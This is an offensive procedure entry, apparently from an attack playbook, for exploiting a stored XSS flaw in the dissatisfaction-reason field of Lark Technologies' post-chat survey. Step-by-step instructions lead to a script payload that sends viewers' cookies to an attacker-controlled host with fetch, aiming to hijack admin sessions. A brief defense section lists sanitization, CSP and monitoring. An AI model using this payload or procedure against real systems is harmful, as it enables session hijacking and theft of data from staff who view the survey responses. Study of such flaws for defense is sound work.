---
tags:
  - xss
  - stored-xss
  - injection
  - web
type: procedure
tools: []
tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
commands: []
platforms:
  - Web
techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
skill_level: intermediate
impact_level: high
detection_risk: low
sub_techniques: []
id: f8d0bc73-5d9f-4481-82f4-943ee50f3dee
created_at: '2025-12-13T23:52:24.770Z'
updated_at: '2025-12-13T23:52:24.770Z'
verified: false
validated: true
submitted: true
mitre_tactics:
  - '[[Initial Access]]'
  - '[[Execution]]'
mitre_techniques:
  - '[[Exploit Public-Facing Application]]'
  - '[[JavaScript]]'
---
# Inject-Malicious-Payload-in-Dissatisfaction-Reason-Field

## Summary

This procedure exploits a stored XSS vulnerability in the Lark Technologies satisfaction survey by injecting malicious JavaScript into the 'Ask Reason for Dissatisfaction' field after selecting a poor rating. The payload is stored server-side and executes when viewed by other users, such as admins, potentially leading to session hijacking or data theft.

## Description

The vulnerability arises from insufficient input sanitization in the dissatisfaction reason field of the post-chat survey. Attackers can submit HTML/JavaScript payloads that are persisted in the database and rendered without proper output encoding when survey responses are displayed to support staff. This allows client-side script execution in the victim's browser context, enabling attacks like cookie theft via `document.cookie` exfiltration to an attacker-controlled server. Prerequisites include access to the help desk chat feature; no elevated privileges are needed for injection, but viewing requires admin access.

## Requirements

1. Access to Lark Technologies web platform with help desk chat functionality
2. Ability to complete a chat session and trigger the satisfaction survey
3. Web browser for manual submission or tools like curl/Burp for automation
4. Attacker-controlled domain for payload exfiltration (optional for advanced exploitation)

## Defense

Defensive measures and detection strategies:

- Implement strict input sanitization and output encoding (e.g., using libraries like DOMPurify) on all user inputs, especially in survey fields
- Use Content Security Policy (CSP) headers to restrict script execution
- Monitor for anomalous JavaScript payloads in logs and scan stored content for XSS patterns
- Rate-limit survey submissions and validate rating-based field activations

## Objectives

1. Inject and store malicious JavaScript payload in the survey response
2. Trigger execution on admin viewers to steal session data or perform other client-side attacks
3. Achieve unauthorized access or data exfiltration without server-side compromise

## Instructions

### Step 1: Initiate Help Desk Chat

**Context**: Start a chat session to reach the satisfaction survey trigger.

Log in to the Lark platform (if required) and initiate a help desk chat. Complete a minimal interaction to end the session.

### Step 2: Select Poor Rating and Inject Payload

**Context**: After chat completion, the survey appears; choose a low rating to activate the reason field and submit the XSS payload.

In the satisfaction survey, select a poor rating (e.g., 1 star). When prompted for 'Reason for Dissatisfaction', enter the malicious payload:

```html
<script>alert('XSS')</script>
```

For exploitation, use:

```html
<script>fetch('http://attacker.com/steal?cookie=' + document.cookie);</script>
```

Submit the form. No command-line tool is strictly required, but for automation, intercept the POST request with a proxy and modify the 'reason' parameter.

> The submission should succeed without errors. The payload is now stored and will execute on view.

### Step 3: Verify Execution

**Context**: Confirm the payload triggers XSS when the response is viewed.

Use a secondary account or notify an admin to view the survey responses. Observe the alert or check attacker server logs for exfiltrated data.

> Successful execution shows the JavaScript running in the viewer's browser, e.g., popup or network request to attacker domain.

## MITRE ATT&CK Mapping

### Tactics

- [[Initial Access]]
- [[Execution]]

### Techniques

- [[Exploit Public-Facing Application]]
- [[JavaScript]]

### Sub-Techniques


## Commands Used


## Tools Used


## Tags

- [[xss]]
- [[stored-xss]]
- [[web]]
- [[injection]]
